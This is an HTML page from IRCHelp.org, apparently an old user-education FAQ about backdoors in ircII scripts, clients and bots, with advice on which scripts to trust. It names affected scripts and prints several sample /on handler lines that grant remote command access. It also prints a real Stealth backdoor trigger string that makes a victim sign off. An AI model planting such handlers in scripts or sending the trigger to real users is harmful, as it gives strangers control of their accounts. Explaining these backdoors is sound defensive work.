@@ -1,0 +1,504 @@
+<!doctype html>
+<html>
+<head>
+    <title>IRCHelp.org &mdash; Untitled Page</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="description" content="Comprehensive information on everything Internet Relay Chat" />
+    <meta name="author" content="irchelpers" />
+    <meta name="generator" content="PieCrust 1.3.0-dev" />
+    <meta name="template-engine" content="Twig" />
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,
+      initial-scale=1.0">
+    <!-- Le styles -->
+    <link href="/css/bootstrap.css" rel="stylesheet">
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+    </style>
+    <link href="/css/bootstrap-responsive.css" rel="stylesheet">
+    <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+    <!-- Fav and touch icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144"
+      href="/ico/apple-touch-icon-144-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="114x114"
+      href="/ico/apple-touch-icon-114-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="72x72"
+      href="/ico/apple-touch-icon-72-precomposed.png">
+    <link rel="apple-touch-icon-precomposed"
+      href="/ico/apple-touch-icon-57-precomposed.png">
+    <link rel="shortcut icon" href="/ico/favicon.png">
+</head>
+<body>
+    <!--Start of navigation-->
+    <div class="navbar navbar-inverse navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container"> <a class="btn btn-navbar"
+            data-toggle="collapse" data-target=".nav-collapse"> <span
+              class="icon-bar"></span> <span class="icon-bar"></span> <span
+              class="icon-bar"></span> </a> <a class="brand" href="/">#irchelp</a>
+          <div class="nav-collapse collapse">
+            <ul class="nav">
+              <li class="active"><a href="/">Home</a></li>
+              <li><a href="/irchelp/credit.html">About</a></li>
+              <li class="dropdown"> <a href="/irchelp/clients" class="dropdown-toggle"
+                  data-toggle="dropdown">Clients </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/clients">All Clients</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Windows</li>
+                  <li><a href="/irchelp/clients/windows/mirc">mIRC</a></li>
+                  <li><a href="/irchelp/clients/windows/xchat">XChat</a></li>
+                  <li><a href="/irchelp/clients/windows">All Windows Clients</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">MacOS X</li>
+                  <li><a href="/irchelp/clients/mac/textual.html">Textual</a></li>
+                  <li><a href="/irchelp/clients/mac/colloquy.html">Colloquy</a></li>
+                  <li><a href="/irchelp/clients/mac/snak.html">Snak</a></li>
+                  <li><a href="/irchelp/clients/mac">All MacOS X Clients</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Linux/Unix Terminal</li>
+                  <li><a href="/irchelp/clients/unix/irssi">irssi</a></li>
+                  <li><a href="/irchelp/clients/unix/epic.html">EPIC</a></li>
+                  <li><a href="/irchelp/clients/unix/ircii">ircII</a></li>
+                  <li><a href="/irchelp/clients/unix/index.html#terminal">All Linux/Unix Terminal Clients</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Linux/Unix Graphical</li>
+                  <li><a href="/irchelp/clients/unix/xchat.html">XChat</a></li>
+                  <li><a href="/irchelp/clients/unix/konversation.html">Konversation</a></li>
+                  <li><a href="/irchelp/clients/unix/index.html#gui">All Linux/Unix Graphical Clients</a></li>
+                  <li class="nav-header">Smartphones</li>
+                  <li><a href="/irchelp/clients/mobile/android">Clients for Android</a></li>
+                  <li><a href="/irchelp/clients/mobile/ios">Clients for iOS</a></li>
+                  <li><a href="/irchelp/clients/mobile">All Smartphone Clients</a></li>
+                  <li class="nav-header">Other OS and Crossplatform</li>
+                  <li><a href="/irchelp/clients/cross/java">Clients writting in Java</a></li>
+                  <li><a href="/irchelp/clients/cross">Other Crossplatform Clients</a></li>
+                  <li><a href="/irchelp/clients/otheros">Clients for other Operating Systems</a></li>
+                  <li><a href="/irchelp/clients/webclients.html">Web-based clients</a></li>
+
+                </ul>
+              </li>
+              <li class="dropdown"> <a href="/irchelp/networks" class="dropdown-toggle"
+                  data-toggle="dropdown">Networks </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/networks/popular.html">Major Networks</a></li>
+                  <li><a href="/irchelp/networks/regional.html">Regional Networks</a></li>
+                  <li><a href="/irchelp/networks/topical.html">Topical Networks</a></li>
+                  <li><a href="/irchelp/networks">All Networks</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Major Networks</li>
+                  <li><a href="/irchelp/networks/efnet/">EFNet</a></li>
+                  <li><a href="/irchelp/networks/ircnet.html">IRCnet</a></li>
+                  <li><a href="/irchelp/networks/undernet.html">Undernet</a></li>
+                  <li><a href="/irchelp/networks/dalnet.html">Dalnet</a></li>
+                  <li><a href="/irchelp/networks/quakenet.html">Quakenet</a></li>
+                  <li><a href="/irchelp/networks/freenode.html">Freenode</a></li>
+                </ul>
+              </li>
+              <li class="dropdown"> <a href="/irchelp/security" class="dropdown-toggle"
+                  data-toggle="dropdown">Security </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/security">General Security</a></li>
+                  <li><a href="/irchelp/security/privacy.html">Privacy</a></li>
+                  <li><a href="/irchelp/security/nuke.html">Denial of Service</a></li>
+                  <li><a href="/irchelp/security/trojan.html">Trojan Horses and Other Malware</a></li>
+                  <li><a href="/irchelp/security/socialeng.html">Social Engineering</a></li>
+                </ul>
+              </li>
+              <li class="dropdown"> <a href="/irchelp/ircd" class="dropdown-toggle"
+                  data-toggle="dropdown">Servers </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/ircd">General ircd information</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">EFNet IRCDs</li>
+                  <li><a href="/irchelp/ircd/ratbox">ircd-ratbox</a></li>
+                  <li><a href="/irchelp/ircd/hybrid">ircd-hybrid</a></li>
+                </ul>
+              </li>
+              <li class="dropdown"> <a href="#" class="dropdown-toggle"
+                  data-toggle="dropdown">FAQs </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/new2irc.html">New user introduction</a></li>
+<!--
+                  <li><a href="#">Another action</a></li>
+                  <li><a href="#">Something else here</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Nav header</li>
+                  <li><a href="#">Separated link</a></li>
+                  <li><a href="#">One more separated link</a></li>
+-->
+                </ul>
+              </li>
+              <li class="dropdown"> <a href="/irchelp/library.html" class="dropdown-toggle"
+                  data-toggle="dropdown">Library </a>
+                <ul class="dropdown-menu">
+                  <li><a href="/irchelp/library.html">Index</a></li>
+<!--
+                  <li><a href="#">Another action</a></li>
+                  <li><a href="#">Something else here</a></li>
+                  <li class="divider"></li>
+                  <li class="nav-header">Nav header</li>
+                  <li><a href="#">Separated link</a></li>
+                  <li><a href="#">One more separated link</a></li>
+-->
+                </ul>
+              </li>
+            </ul>
+            <form class="navbar-form pull-right"> <input class="span2"
+                placeholder="Search" type="text"> <button type="submit"
+                class="btn">Search</button> </form>
+          </div>
+          <!--/.nav-collapse --> </div>
+      </div>
+    </div>
+<!--end of navigation-->
+
+    <div id="container" class="container">
+<!--
+                        <h1><a href="/">Untitled Page</a></h1>
+            -->        
+        
+            <div class="content">
+                                <pre><code>      Bugs and Backdoors in IRC clients, scripts and bots
+
+      ---------------------------------------------------
+</code></pre>
+
+<ol>
+<li>What is a backdoor?</li>
+</ol>
+
+<hr />
+
+<p>A backdoor is a feature of a program that can be used to make it act in</p>
+
+<p>some way that the person who is running it did not intend.</p>
+
+<p>Among IRC-related programs, bots, clients and scripts can have</p>
+
+<p>backdoors.</p>
+
+<p>An important point to note is that some backdoors are intentional and</p>
+
+<p>some are not; with ircII scripts specifically, the problem is that</p>
+
+<p>ircII is not a very clear programming language when it comes to</p>
+
+<p>evaluation, and neither is sh/csh (used in all the /EXECs), and it&#8217;s</p>
+
+<p>easy for someone who doesn&#8217;t really understand what he&#8217;s doing to put</p>
+
+<p>unwanted backdoors. In clients and bots, which are usually written in</p>
+
+<p>C, the bugs or backdoors tend to be harder to find and exploit.</p>
+
+<p>The line between an unintended backdoor and a bug is rather thin, I&#8217;d</p>
+
+<p>call it a backdoor if it can be used to make the bot do somethign</p>
+
+<p>specific, and just a bug if it can be used only to make the client or</p>
+
+<p>bot disconnect (ping timeout, or excess flood).</p>
+
+<ol>
+<li>How dangerous can a backdoor be?</li>
+</ol>
+
+<hr />
+
+<p>A backdoor can be more or less &#8220;powerful&#8221;, according to how much</p>
+
+<p>access to your client&#8217;s features and/or account it gives to an intruder.</p>
+
+<p>In the worst cases, a backdoor will let an intruder execute arbitrary</p>
+
+<p>commands on the machine your client or bot is running, allowing full</p>
+
+<p>access to your account. This can in turn allow an intruder to compromise</p>
+
+<p>your whole system&#8217;s security, by cracking passwords or otherwise. They</p>
+
+<p>can also make you send mail, post to Usenet, etc. I will call this</p>
+
+<p>giving Unix access.</p>
+
+<p>In other cases, the backdoor will let the intruder control your IRC</p>
+
+<p>client, making it do all IRC-related things like joining channels,</p>
+
+<p>speaking in them, or signing off, or /killing if you&#8217;re an IRCop. I will</p>
+
+<p>call this giving IRC access.</p>
+
+<p>And in some cases, the backdoor will only let them do some specific</p>
+
+<p>things. The most common case is when the backdoor only lets an intruder</p>
+
+<p>disconnect you from IRC.</p>
+
+<p>Typically, unintended backdoors and bugs will either give full Unix and</p>
+
+<p>IRC access, or just let anyone kill the client.</p>
+
+<ol>
+<li>What known scripts, clients and bots have backdoors?</li>
+</ol>
+
+<hr />
+
+<p>Off the top of my head (I&#8217;ve <em>SEEN</em> all of these, and some of them I&#8217;ve</p>
+
+<p>found myself) :</p>
+
+<ul>
+<li><p>iNFiNiTY, toolZ, UltBox (and probably other related scripts) have a</p>
+
+<p>backdoor (very likely unintended) that gives full Unix access to</p>
+
+<p>anyone.</p></li>
+<li><p>early versions of GargOyle have an intended backdoor (supposedly</p>
+
+<p>stolen from some other script) that gives Unix and IRC access to</p>
+
+<p>anyone.</p></li>
+<li><p>some versions of PhoEniX have an unintended backdoor that let people</p>
+
+<p>make you signoff</p></li>
+<li><p>Pillow Fighter II has an intended backdoor that gives Unix and IRC</p>
+
+<p>access to anyone.</p></li>
+<li><p>Stealth has at least 2 intended backdoors, one of which gives</p>
+
+<p>Unix and IRC access to anyone, and the other one that lets people</p>
+
+<p>make you signoff.</p></li>
+<li><p>Some (old) versions of Axis have a backdoor that give on specific</p>
+
+<p>person Unix and IRC access, and another one that makes you give him</p>
+
+<p>ops. Recent versions supposedly don&#8217;t have it; I haven&#8217;t checked</p>
+
+<p>them.</p></li>
+<li><p>Some (hacked?) versions of the VeVeS script have an intended</p>
+
+<p>backdoor that gives Unix and IRC access to anyone.</p></li>
+<li><p>IrcOP.irc is a trojan horse script (i.e. it does NOTHING useful for</p>
+
+<p>you) which removes all your files, opens your account to anyone,</p>
+
+<p>and makes you do obnoxious stuff on IRC.</p></li>
+<li><p>Some (hacked?) versions of the ComBot bot have an intended backdoor</p>
+
+<p>that gives IRC access to anyone.</p></li>
+<li><p>eggdrop bots, if improperly configured, can give Unix access to</p>
+
+<p>to anyone with bot-master privileges.</p></li>
+<li><p>All VladBots, ComBot, HackBots, Kn1ghtBots, DweebBots, StelBots and</p>
+
+<p>similar bots can be killed (segmentation fault, bus error, or ping</p>
+
+<p>timeout, according to specific details), with more or less</p>
+
+<p>difficulty (and without flooding them).</p></li>
+<li><p>Some hacked old version of ircII 2.2.9 have a backdoor that gives</p>
+
+<p>anyone Unix and IRC access. This one was the object of a CERT</p>
+
+<p>advisory.</p></li>
+<li><p>Old versions of ircII (prior to 2.3.x-beta) have a bug in the</p>
+
+<p>filtering of escape sequences that lets anyone with ops on a</p>
+
+<p>channel where you are to mess up your screen.</p></li>
+<li><p>Old versions of ircII (prior to 2.6) have a bug in DCC handling</p>
+
+<p>that lets someone make you ping timeout once you have a DCC</p>
+
+<p>connection with them.</p></li>
+</ul>
+
+<p>This is by no means a comprehensive list; there are tons of scripts out</p>
+
+<p>there and I don&#8217;t spend my time skimming them all. In particular I&#8217;ve</p>
+
+<p>never looked closely at TextBox or LiCe, and I know of no-one who has,</p>
+
+<p>so I wouldn&#8217;t trust them either.</p>
+
+<ol>
+<li>How does a backdoor work?</li>
+</ol>
+
+<hr />
+
+<p>In ircII, backdoors are typically /on statements like these:</p>
+
+<h1>1  -   /on ^ctcp &#8220;% % BACKDOOR *&#8221; $3-</h1>
+
+<h1>2  -   /on ^notice &#8220;% BACKDOOR *&#8221; $2-</h1>
+
+<h1>3  -   /on ^ctcp &#8220;% % BACKDOOR *&#8221; quote $3-</h1>
+
+<h1>4  -   /on ^ctcp &#8220;% % DCC SEND % *&#8221; exec -name stuff ls $5</h1>
+
+<h1>5  -   /on -notice &#8220;% STUFF*&#8221; eval ^assign blah $3-</h1>
+
+<h1>1 and #2 are obviously intended, and give anyone IRC and Unix</h1>
+
+<p>(by sending EXEC commands) access.</p>
+
+<h1>3 is obviously intended too, and gives IRC access only.</h1>
+
+<h1>4 looks like an unintended bug, but still gives full Unix access</h1>
+
+<p>to anyone (beware, this can be made safe by $strip()ing lots of</p>
+
+<p>characters, but is a potentially dangerous thing to do. Did <em>you</em></p>
+
+<p>know that ^ is interpreted like | by SunOS /bin/sh&#8217;s?).</p>
+
+<p>With #5, the problem is the eval, but once again, since ircII lets</p>
+
+<p>you execute the contents of variables without an eval, looking for</p>
+
+<p>all the evals and all the /on&#8217;s and all the /exec&#8217;s is <em>not</em> a safe</p>
+
+<p>way to be sure a script is backdoor-free.</p>
+
+<p>Finally, a real example of a backdoor, for the most skeptical; this</p>
+
+<p>is taken straight out of the Stealth script:</p>
+
+<p>alias qwrrw {</p>
+
+<p>/echo [^BFate^B] You have been killed</p>
+
+<p>/signoff I&#8217;m a dork, and I am sorry for disturbing you all.  I&#8217;ll leave now}</p>
+
+<p>on ^notice &#8220;% 53764^B^B856324^B^B32fd563gf^Vds5rx^B^Bfdtsr5ss54&#8221; {/qwrrw}</p>
+
+<p>So if someone is running Stealth, all you have to do is</p>
+
+<p>/notice nickname 53764^B^B856324^B^B32fd563gf^Vds5rx^B^Bfdtsr5ss54</p>
+
+<p>and they signoff.</p>
+
+<p>And I&#8217;d like to see anyone arguing that this was not intended&#8230;</p>
+
+<ol>
+<li>How can I avoid backdoors?</li>
+</ol>
+
+<hr />
+
+<p>It all comes to a simple fact: IRC is full of people who cannot be</p>
+
+<p>trusted, and running (/load&#8217;ing) a script (or a bot) that someone sent</p>
+
+<p>you is akin to putting a <em>lot</em> of trust in this person, <em>AND</em> in all the</p>
+
+<p>people who have had this script between the original author and whoever</p>
+
+<p>sent it to you. You don&#8217;t only need to trust that the person doesn&#8217;t</p>
+
+<p>mean to harm you, but also that the person can <em>check</em> and make sure</p>
+
+<p>that they aren&#8217;t going to.</p>
+
+<p>War scripts like Serpent and Phoenix and TextBox and LiCe are the least</p>
+
+<p>trustable for a number of reasons:</p>
+
+<ul>
+<li><p>Someone who writes a script (or puts his name at the top of a bunch</p>
+
+<p>of stolen routines) that can be disruptive to the net is obviously</p>
+
+<p>not someone who is interested in doing people a favor. Trusting</p>
+
+<p>their code is really the thing not to do.</p></li>
+<li><p>These scripts tend to be <em>very</em> big (200k is no uncommon&#8230;) and</p>
+
+<p>thus are a pain to check. I have looked at some in enough detail</p>
+
+<p>to find backdoors, but you need to look a <em>lot</em> more carefully</p>
+
+<p>to be able to say that there are none left. Definitely not for</p>
+
+<p>the casual user.</p></li>
+<li><p>They are often distributed from one to another, instead of getting</p>
+
+<p>them from some &#8220;official&#8221; place. This means that any one with a</p>
+
+<p>minimum knowledge of ircII scripting can add 2 lines in the middle</p>
+
+<p>of Phoenix, increase the version number, and send it around.</p></li>
+</ul>
+
+<p>The scripts <em>I</em> would personally trust:</p>
+
+<p>zer0     -  I&#8217;ve written it myself, so I know there are no backdoors,</p>
+
+<pre><code>  I'm reasonably sure there are no exploitable bugs, and
+
+
+  it's small enough for anyone to check in a reasonable
+
+
+  time.
+
+
+  You can get it from
+
+
+  http://www.eleves.ens.fr:8080/home/espel/index.html.
+</code></pre>
+
+<p>Deturbo  -  Written by DeadelviS.</p>
+
+<p>SuperPak -  Written by TG; get version 3.2, <em>not</em> Barron&#8217;s version</p>
+
+<pre><code>  (numbered 5.4).
+</code></pre>
+
+<p>All of these can be found in ftp://isr0954.urh.uiuc.edu/pub/irc/scripts</p>
+
+<hr />
+
+<p>You can send any additional comments to:</p>
+
+<p>orabidoo <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#x72;&#111;&#103;&#x65;&#114;&#46;&#x65;&#x73;&#112;e&#x6c;&#46;&#108;&#x6c;&#x69;&#109;a&#x40;&#101;&#110;&#x73;&#x2e;&#102;r">&#x72;&#111;&#103;&#x65;&#114;&#46;&#x65;&#x73;&#112;e&#x6c;&#46;&#108;&#x6c;&#x69;&#109;a&#x40;&#101;&#110;&#x73;&#x2e;&#102;r</a></p>
+
+                            </div>
+        
+        <footer>
+
+                        <p>All documents &copy; irchelp.org or original authors 2013 <br />Baked with <em><a href="http://bolt80.com/piecrust/">PieCrust</a> 1.3.0-dev</em>.</p>
+                    </footer>
+    </div>
+    
+        <!-- Le javascript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="/js/jquery.js"></script>
+    <script src="/js/bootstrap-transition.js"></script>
+    <script src="/js/bootstrap-alert.js"></script>
+    <script src="/js/bootstrap-modal.js"></script>
+    <script src="/js/bootstrap-dropdown.js"></script>
+    <script src="/js/bootstrap-scrollspy.js"></script>
+    <script src="/js/bootstrap-tab.js"></script>
+    <script src="/js/bootstrap-tooltip.js"></script>
+    <script src="/js/bootstrap-popover.js"></script>
+    <script src="/js/bootstrap-button.js"></script>
+    <script src="/js/bootstrap-collapse.js"></script>
+    <script src="/js/bootstrap-carousel.js"></script>
+    <script src="/js/bootstrap-typeahead.js"></script>
+</body>
+</html>
